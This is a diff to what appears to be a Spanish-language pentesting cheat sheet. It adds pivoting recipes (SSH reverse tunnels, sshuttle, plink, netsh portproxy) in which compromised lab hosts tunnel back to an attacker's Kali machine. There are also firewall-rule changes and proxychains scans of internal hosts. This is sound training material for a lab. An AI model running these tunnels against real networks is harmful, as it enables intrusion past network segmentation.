@@ -1137,7 +1137,7 @@ sudo ip tuntap add user $(whoami) mode tun ligolo
 sudo ip link set ligolo up
 ```
 
-####  6.2.3. <a name='configurar-proxy-en-la-máquina-del-atacante'></a>Configurar proxy en la máquina del atacante
+####  6.2.3. <a name='configurar-proxy-en-la-máquina-del-atacante'></a>Configurar proxy en Kali
 
 ```bash
 ./proxy -laddr <LHOST>:443 -selfcert
@@ -1189,7 +1189,7 @@ En este caso, el puerto que queremos redireccionar es el `445` de la  máquina W
 ssh -N -D 0.0.0.0:9999 <user>@10.10.100.20
 ```
 
-##### Atacante
+##### Kali
 
 Agregamos la conexión al proxy en el archivo `proxychains4.conf` (Kali) en Parrot es `proxychains.conf`.
 
@@ -1197,6 +1197,191 @@ Agregamos la conexión al proxy en el archivo `proxychains4.conf` (Kali) en Parr
 vim /etc/proxychains4.conf
 socks5 192.168.50.10 9999
 proxychains smbclient -p 4455 //172.16.50.10/<SHARE> -U <USERNAME> --password=<PASSWORD>
+```
+
+#### Remote Dynamic Port Forwarding
+
+![Remote Dynamic Port Forwarding](./img/remote_dynamic_port_forwarding.png)
+
+KALI <-> FIREWALL <-> WEB > DATABASE > SHARES
+
+
+##### Kali
+
+```bash
+sudo systemctl start ssh
+sudo ss -tulpn
+```
+
+##### Máquina Web
+
+```bash
+ssh -N -R 127.0.0.1:2345:10.10.100.20:5432 kali@192.168.50.10
+```
+
+##### Kali
+
+```bash
+psql -h 127.0.0.1 -p 2345 -U postgres
+```
+
+#### Remote Dynamic Port Forwarding
+
+![Remote Dynamic Port Forwarding](./img/remote_dynamic_port_forwarding.png)
+
+KALI <- FIREWALL <- WEB -> INTERNAL NETWORK
+
+##### Máquina Web
+
+```bash
+ssh -N -R 9998 kali@192.168.50.10
+```
+
+##### Kali
+
+```bash
+sudo ss -tulpn
+vim /etc/proxychains4.conf
+socks5 127.0.0.1 9998 # agregar esta linea
+
+# Realizamos escaneos a través de proxychains
+proxychains nmap -vvv -sT --top-ports=20 -Pn -n 10.10.100.20
+```
+
+#### sshuttle
+
+| Sistema             | IP             |
+| ------------------- | -------------- |
+| LHOST               | 192.168.50.10  |
+| APPLICATION SERVER  | 192.168.100.10 |
+| WINDOWS JUMP SERVER | 192.168.100.20 |
+| DATABASE SERVER     | 10.10.100.20   |
+| WINDOWS HOST        | 172.16.50.10   |
+
+*KALI -> WEB -> INTERNAL NETWORK*
+
+##### Máquina Web
+
+```bash
+socat TCP-LISTEN:2222,fork TCP:10.10.100.20:22
+```
+
+##### Kali
+
+```bash
+sshuttle -r <user>@192.168.100.10:2222 10.10.100.0/24 172.16.50.0/24
+smbclient -L //172.16.50.10/ -U <user> --password=<password>
+```
+
+#### ssh.exe
+
+| Sistema             | IP             |
+| ------------------- | -------------- |
+| LHOST               | 192.168.50.10  |
+| APPLICATION SERVER  | 192.168.100.10 |
+| WINDOWS JUMP SERVER | 192.168.100.20 |
+| DATABASE SERVER     | 10.10.100.20   |
+| WINDOWS HOST        | 172.16.50.10   |
+
+*KALI <- FIREWALL <- WINDOWS JUMP SERVER -> INTERNAL NETWORK*
+
+##### Kali
+
+```bash
+sudo systemctl start ssh
+xfreerdp /u:<USERNAME> /p:<PASSWORD> /v:192.168.100.20
+```
+
+##### Windows Jump Server
+
+```powershell
+where ssh
+C:\Windows\System32\OpenSSH\ssh.exe
+C:\Windows\System32\OpenSSH> ssh -N -R 9998 <USERNAME>@192.168.50.10
+```
+
+##### Kali
+
+```bash
+ss -tulpn
+vim /etc/proxychains4.conf
+socks5 127.0.0.1 9998  # agregar esta linea
+
+proxychains psql -h 10.10.100.20 -U postgres
+```
+
+#### Plink
+
+| Sistema             | IP             |
+| ------------------- | -------------- |
+| LHOST               | 192.168.50.10  |
+| APPLICATION SERVER  | 192.168.100.10 |
+| WINDOWS JUMP SERVER | 192.168.100.20 |
+| DATABASE SERVER     | 10.10.100.20   |
+| WINDOWS HOST        | 172.16.50.10   |
+
+*KALI <- FIREWALL <- WINDOWS JUMP SERVER*
+
+##### Kali
+
+```bash
+find / -name plink.exe 2>/dev/null
+/usr/share/windows-resources/binaries/plink.exe
+```
+
+##### Windows Jump Server
+
+```powershell
+plink.exe -ssh -l <USERNAME> -pw <PASSWORD> -R 127.0.0.1:9833:127.0.0.1:3389 192.168.50.10
+```
+
+##### Kali
+
+```bash
+ss -tulpn
+xfreerdp /u:<USERNAME> /p:<PASSWORD> /v:127.0.0.1:9833
+```
+
+#### Netsh
+
+| Sistema             | IP             |
+| ------------------- | -------------- |
+| LHOST               | 192.168.50.10  |
+| APPLICATION SERVER  | 192.168.100.10 |
+| WINDOWS JUMP SERVER | 192.168.100.20 |
+| DATABASE SERVER     | 10.10.100.20   |
+| WINDOWS HOST        | 172.16.50.10   |
+
+
+*KALI <- FIREWALL <- WINDOWS JUMP SERVER -> DATABASE*
+
+##### Kali
+
+```bash
+xfreerdp /u:<USERNAME> /p:<PASSWORD> /v:192.168.100.20
+```
+
+##### Windows Jump Server
+
+```powershell
+netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.50.10 connectport=22 connectaddress=10.10.100.20
+netstat -anp TCP | findstr "2222"
+netsh interface portproxy show all
+netsh advfirewall firewall add rule name="port_forward_ssh_2222" protocol=TCP dir=in localip=192.168.50.10 localport=2222 action=allow
+```
+
+##### Kali
+
+```bash
+sudo nmap -sS 192.168.50.10 -Pn -n -p2222
+ssh database_admin@192.168.50.10 -p2222
+```
+
+##### Windows Jump Server
+
+```powershell
+netsh advfirewall firewall delete rule name="port_forward_ssh_2222"
+netsh interface portproxy del v4tov4 listenport=2222 listenaddress=192.168.50.10
 ```
 
 ##  7. <a name='passwords-attacks'></a>Passwords Attacks
